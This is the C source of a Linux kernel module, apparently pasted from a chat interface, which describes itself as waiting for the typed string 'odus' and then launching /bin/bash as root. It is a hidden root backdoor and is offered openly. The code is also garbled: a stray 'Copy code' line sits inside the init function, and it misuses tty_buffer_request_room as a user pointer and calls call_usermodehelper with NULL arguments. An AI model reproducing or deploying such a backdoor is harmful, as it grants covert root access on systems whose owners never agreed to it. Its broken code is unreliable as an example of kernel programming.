#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/sched.h>

#define STR "odus"

static struct task_struct *thread;

static int thread_func(void *data)
{
char buf[5];
int i = 0;


while (1) {
    if (kthread_should_stop())
        break;

    if (i == 5) {
        i = 0;
        if (strncmp(buf, STR, 4) == 0) {
            if (call_usermodehelper("/bin/bash", NULL, NULL, UMH_WAIT_PROC) != 0) {
                printk(KERN_ERR "Failed to start /bin/bash process");
            }
        }
    }

    if (get_user(buf[i], (char __user *)tty_buffer_request_room(current->signal->tty, 1))) {
        return -EFAULT;
    }
    i++;
}

return 0;
}

static int __init mod_init(void)
{
thread = kthread_run(thread_func, NULL, "thread_func");

Copy code
if (IS_ERR(thread)) {
    printk(KERN_ERR "Failed to create kernel thread");
    return PTR_ERR(thread);
}

return 0;
}

static void __exit mod_exit(void)
{
kthread_stop(thread);
}

module_init(mod_init);
module_exit(mod_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sudo John Sudo");
MODULE_DESCRIPTION("Kernel module waiting for keyboard string 'odus' and starting /bin/bash process as root");


